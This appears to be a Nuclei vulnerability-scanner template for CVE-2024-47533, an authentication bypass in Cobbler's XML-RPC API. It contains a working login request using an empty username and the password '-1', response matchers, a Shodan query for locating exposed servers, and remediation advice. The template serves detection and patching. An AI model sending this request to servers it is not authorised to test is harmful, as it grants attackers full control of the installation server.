http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <methodResponse>
    - </string></value>
  - part: content_type
    type: word
    words:
    - text/xml
  - status:
    - 200
    type: status
  - negative: true
    part: body
    type: word
    words:
    - <boolean>0</boolean>
  matchers-condition: and
  raw:
  - "POST /cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml\
    \ version='1.0'?>\n<methodCall>\n  <methodName>login</methodName>\n  <params>\n\
    \    <param>\n      <value><string></string></value>\n    </param>\n    <param>\n\
    \      <value><string>-1</string></value>\n    </param>\n  </params>\n</methodCall>\n"
id: CVE-2024-47533
info:
  author: songyaeji
  classification:
    cve-id: CVE-2024-47533
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.97878
    epss-score: 0.53694
  description: 'Cobbler, a Linux installation server that allows for rapid setup of
    network installation environments, has an improper authentication vulnerability
    starting in version 3.0.0 and prior to versions 3.2.3 and 3.3.7. `utils.get_shared_secret()`
    always returns `-1`, which allows anyone to connect to cobbler XML-RPC as user
    `''''` password `-1` and make any changes. This gives anyone with network access
    to a cobbler server full control of the server. Versions 3.2.3 and 3.3.7 fix the
    issue.

    '
  impact: 'Anyone with network access can connect to Cobbler XML-RPC with default
    credentials and make arbitrary changes, gaining full control.

    '
  metadata:
    max-request: 1
    shodan-query: http.title:"Cobbler Web Interface"
    verified: true
  name: Cobbler 'XML-RPC' - Authentication Bypass
  reference:
  - https://github.com/cobbler/cobbler/commit/32c5cada013dc8daa7320a8eda9932c2814742b0
  - https://github.com/cobbler/cobbler/commit/e19717623c10b29e7466ed4ab23515a94beb2dda
  - https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h
  remediation: 'Update Cobbler to version 3.2.3 or 3.3.7 or later.

    '
  severity: critical
  tags: cve,cve2024,cobbler,auth-bypass,unauth,xmlrpc,vuln
